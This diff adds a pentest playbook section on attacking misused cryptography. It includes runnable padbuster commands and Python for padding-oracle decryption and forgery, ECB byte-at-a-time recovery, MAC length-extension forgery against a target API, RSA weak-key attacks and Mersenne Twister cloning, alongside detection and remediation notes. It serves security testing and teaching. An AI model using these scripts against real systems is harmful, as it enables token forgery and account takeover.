@@ -215,3 +215,184 @@ open("id_rsa","wb").write(RSA.construct((n,e,d,p,q)).export_key("PEM"))
 Tell: two near-identical primes -> `p - q` is tiny (a few thousand). Key length = `n.bit_length()`.
 
 <!-- promoted-slug: rsa-fermat-close-primes -->
+
+# Crypto implementation attacks
+
+Distilled from claude-red `offensive-crypto-attacks`; feeds `wiki/techniques/cracking/cryptography-attacks.md` on promote. Attacks misuse of primitives, not the primitives. Operator promotes; never auto-promoted.
+
+Workflow: identify crypto touchpoints (cookies, tokens, signed URLs, stored creds) -> fingerprint algorithm/mode (length behavior, block alignment, base64/hex layers) -> classify weakness class -> tool or custom script -> decrypt/forge -> document root cause + remediation.
+
+Ciphertext heuristics: multiple of 8 bytes = DES/3DES CBC/ECB; multiple of 16 = AES CBC/ECB; plaintext+16 = AES-GCM; fixed length regardless of input = hash, not encryption.
+
+## Padding oracle (CBC + PKCS7)
+
+Decision flow:
+
+1. Submit modified ciphertext (flip last byte of the previous block / IV) to the decrypting endpoint.
+2. Observe the response across valid vs invalid padding: different status codes, different error strings, timing differences, or behavioral changes. ANY stable binary signal is the oracle.
+3. One bit per request suffices to decrypt any block AND forge arbitrary plaintext (Vaudenay 2002; Rizzo/Duong 2010).
+4. No signal after systematic probing = no oracle; move to the next class, do not grind.
+
+padbuster invocation:
+
+```bash
+# decrypt: URL target-value block-size(8|16) -error <oracle string>
+padbuster http://target.com/app?token=EncryptedValue EncryptedValue 16 \
+  -cookies "session=EncryptedValue" -encoding 0 -error "invalid"
+
+# forge:
+padbuster http://target.com/app?token=EncryptedValue EncryptedValue 16 \
+  -cookies "session=EncryptedValue" -encoding 0 -error "invalid" \
+  -plaintext "admin=true;user=attacker"
+```
+
+Custom oracle when padbuster cannot handle the encoding/transport: per byte position (right to left), set already-recovered IV bytes to `intermediate[k] ^ pad_val`, brute the current byte 0-255, disambiguate the last-byte edge case by flipping the neighboring bit and re-querying; `plaintext = intermediate ^ prev_block`.
+
+Detection pressure (defender view): hundreds of sequential requests to one endpoint with a single changing byte; alert on binary pass/fail responses for encrypted input.
+
+## ECB: determinism attacks
+
+Detect: encrypt a probe of 3+ identical blocks (`b"A" * 48`); 2+ identical output blocks = ECB.
+
+```python
+def detect_ecb(ciphertext, block_size=16):
+    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
+    return len(blocks) != len(set(blocks))
+```
+
+Byte-at-a-time (oracle appends a secret after your input): for each unknown byte, craft input length so the target byte lands last in a block, capture that ciphertext block, then brute 256 candidate bytes appended to already-recovered prefix until the blocks match.
+
+```python
+def byte_at_a_time_ecb(oracle_func, block_size=16):
+    recovered = b""
+    baseline_len = len(oracle_func(b""))
+    for i in range(baseline_len):
+        block_index = len(recovered) // block_size
+        pad_len = block_size - 1 - (len(recovered) % block_size)
+        padding = b"A" * pad_len
+        target_block = oracle_func(padding)[block_index*block_size:(block_index+1)*block_size]
+        for byte_val in range(256):
+            test = oracle_func(padding + recovered + bytes([byte_val]))
+            if test[block_index*block_size:(block_index+1)*block_size] == target_block:
+                recovered += bytes([byte_val]); break
+    return recovered
+```
+
+Cut-and-paste: where structured data (JSON, key=value, serialized objects) is ECB-encrypted and you control part of the input, assemble ciphertext blocks from your own encrypted blocks to mint a valid object with attacker-controlled fields.
+
+Detection pressure: long runs of 16+ identical bytes submitted to encryption endpoints.
+
+## Hash length extension
+
+Vulnerable construction: `MAC = H(secret || message)` with a Merkle-Damgard hash (MD5/SHA1/SHA256). You need only original MAC, message, and secret length (brute the length range 8-32 if unknown). HMAC is IMMUNE; if HMAC is in use, pivot classes.
+
+```bash
+hashpump -s "original_mac_hex" -d "original_data" -a "&admin=true" -k 16
+```
+
+```python
+import hashpumpy
+for key_len in range(8, 33):
+    new_mac, new_data = hashpumpy.hashpump(original_mac, original_data, "&admin=true", key_len)
+    resp = requests.get(f"http://target.com/api?data={new_data.hex()}&mac={new_mac}")
+    if resp.status_code == 200 and "admin" in resp.text:
+        break   # key_len found, forged MAC accepted
+```
+
+Detection pressure: null bytes (`%00`) in params that should be printable; message bodies longer than expected with padding artifacts.
+
+## RSA weak parameters
+
+Order: attack parameters before padding. RsaCtfTool first:
+
+```bash
+RsaCtfTool --publickey pubkey.pem --private                     # auto attack
+RsaCtfTool --publickey pubkey.pem --uncipherfile ciphertext.bin # decrypt with weak key
+RsaCtfTool --publickey "key1.pem,key2.pem" --private            # common factor across keys
+RsaCtfTool --publickey pubkey.pem --attack wiener   # small d
+RsaCtfTool --publickey pubkey.pem --attack smallq   # small factor
+RsaCtfTool --publickey pubkey.pem --attack fermat   # p,q too close
+```
+
+- Small e (e=3) with short message (`m^e < n`): ciphertext is literally `m^e`, take the integer e-th root (`gmpy2.iroot`).
+- Hastad broadcast: same message to e recipients under e=3, CRT-combine, take the root.
+- Bleichenbacher (PKCS#1 v1.5): oracle = any system distinguishing valid vs invalid v1.5 padding (TLS alerts, API error codes, timing). ~2^20 queries to recover plaintext.
+- Coppersmith: known high bits of a factor (or partial plaintext) -> SageMath `small_roots(X=2^64, beta=0.5)` recovers the rest; `q = n // p`.
+
+```python
+# sage: recover p from known high bits
+P.<x> = PolynomialRing(Zmod(n))
+f = p_approx + x
+roots = f.small_roots(X=2^64, beta=0.5)
+if roots:
+    p = p_approx + int(roots[0]); q = n // p
+```
+
+## MT19937 recovery
+
+Mersenne Twister state clones from exactly 624 consecutive 32-bit outputs: untemper each output (reverse the four temper steps, the shift-xor ones iteratively), load into `random.Random().setstate((3, tuple(state + [624]), None))`, predict all future outputs.
+
+```python
+def untemper(y):
+    y ^= y >> 18
+    y ^= (y << 15) & 0xEFC60000
+    tmp = y
+    for _ in range(7): tmp = y ^ ((tmp << 7) & 0x9D2C5680)
+    y = tmp
+    tmp = y
+    for _ in range(3): tmp = y ^ (tmp >> 11)
+    return tmp
+
+def clone_mt19937(outputs_624):
+    state = (3, tuple([untemper(o) for o in outputs_624] + [624]), None)
+    cloned = random.Random(); cloned.setstate(state)
+    return cloned
+```
+
+Time-seeded PRNGs: brute the seed window (`random.seed(int(time.time()))` -> iterate plausible unix timestamps, compare first `getrandbits(32)` to the observed token). Applies to password-reset tokens, session IDs, generated filenames.
+
+## Timing side channel
+
+Byte-by-byte comparison of MACs/tokens/passwords leaks position of first mismatch. Median-of-N samples per candidate byte (50-100+ over network jitter); pick the slowest candidate, append, repeat. Countermeasure their side: constant-time comparison everywhere.
+
+## AES-GCM nonce reuse
+
+Same key + same nonce twice: XOR of ciphertexts = XOR of plaintexts, and the tag relationship `tag1 XOR tag2 = GHASH(H, aad1, ct1) XOR GHASH(H, aad2, ct2)` gives a polynomial in H over GF(2^128); solving it recovers the GHASH key and enables tag forgery (Joux 2006). Defense: nonce-misuse-resistant AEAD (AES-GCM-SIV, XChaCha20-Poly1305).
+
+## Key derivation
+
+- Single-iteration unsalted `sha256(password)` = direct wordlist crack.
+- PBKDF2 minimums (OWASP 2024): sha1 1,300,000; sha256 600,000; sha512 210,000. Below = weak finding. Argon2id preferred.
+
+## Remediation (one-liners for FIND cards)
+
+- CBC without auth -> AES-GCM / ChaCha20-Poly1305; never leak padding validity.
+- `H(secret||message)` -> HMAC.
+- RSA: 2048-bit minimum, OAEP padding, never e=3 with short messages.
+- PRNG: `secrets` module / `/dev/urandom`; never time/PID seeds.
+- Compare secrets in constant time.
+
+## Worked self-checks (runnable)
+
+```python
+# ECB detector: ECB repeats blocks, CBC does not
+from Crypto.Cipher import AES
+key, iv = b"0"*16, b"0"*16
+assert detect_ecb(AES.new(key, AES.MODE_ECB).encrypt(b"A"*48))
+assert not detect_ecb(AES.new(key, AES.MODE_CBC, iv=iv).encrypt(b"A"*48))
+
+# MT19937 clone: predicts the next draw after 624 observed outputs
+r = random.Random(20261119)
+observed = [r.getrandbits(32) for _ in range(624)]
+assert clone_mt19937(observed).getrandbits(32) == r.getrandbits(32)
+
+# small-e root: m^3 < n means the ciphertext is a plain integer cube
+from gmpy2 import iroot
+m = 0xdeadbeef; n = 1 << 512
+root, perfect = iroot(m**3 % n if m**3 >= n else m**3, 3)
+assert perfect and int(root) == m
+```
+
+References: Vaudenay EUROCRYPT 2002; Bleichenbacher CRYPTO 1998; Rizzo/Duong WOOT 2010; Coppersmith 1997; Joux 2006; CWE-327/328/330; tools RsaCtfTool, PadBuster, HashPump.
+
+<!-- promoted-slug: crypto-implementation-attacks -->
